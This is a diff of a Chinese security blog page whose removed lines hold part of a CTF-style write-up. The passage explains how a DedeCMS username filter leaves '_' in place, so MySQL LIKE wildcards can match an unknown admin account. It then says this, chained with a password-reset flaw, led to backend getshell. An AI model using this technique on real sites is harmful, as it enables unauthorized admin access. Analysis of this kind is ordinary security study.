-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;userName &#x3D; preg_replace(&quot;&#x2F;[^0-9a-zA-Z_@!\.-]&#x2F;&quot;, &#39;&#39;, $username);</span><br></pre></td></tr></table></figure>
-<p>虽然在前面有把一些用户名不允许的字符给替换为空了, 想直接用%这种匹配任意数量字符的模糊查询出数据就不行了。<br>但是可以看到这个过滤没有把_替换为空。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">With LIKE you can use the following two wildcard characters in the pattern:</span><br><span class="line"></span><br><span class="line">% matches any number of characters, even zero characters.</span><br><span class="line"></span><br><span class="line">_ matches exactly one character.</span><br></pre></td></tr></table></figure>
-
-<p>在mysql中的模糊查询中, _也代表着匹配一个任意字符。</p>
-<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/dede_guess_1.jpg" alt="-w1406"></p>
-<p>所以在不知道管理员的用户名的情况下， 只要去用_跑一下, 当_的位数和管理员账户的位数相同时即可登录成功了。 </p>
-<p>巅峰极客的是4位数, 然后用之前修改管理员密码的洞修改的密码, 就成功登录了后台, 然后后台getshell, 就搞定了。</p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
 
 <nav class="pagination">
   
@@ -1078,7 +1072,7 @@
     Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
     </br>
     
-    &copy; 2023 雨了个雨
+    &copy; 2024 雨了个雨
     
   </p>
 </footer>
